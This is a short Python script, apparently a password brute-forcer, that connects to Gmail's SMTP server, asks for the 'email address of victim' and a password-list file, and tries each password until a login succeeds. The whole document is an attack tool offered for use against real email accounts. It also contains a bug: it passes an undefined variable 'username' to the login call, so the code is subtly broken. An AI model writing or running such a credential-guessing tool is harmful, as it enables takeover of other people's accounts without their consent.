import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter email address of victim\n >>")
passfile = input("input the password filename\n >>")
passwords = open(passfile,"r")

for password in passwords:
	try:
		smtpserver.login(username,password)
		print("[+] Password found! %s" % password)
		break;

	except smtplib.SMTPAuthenticationError:
		print("[!] Password Incorrect %s" % password)
		



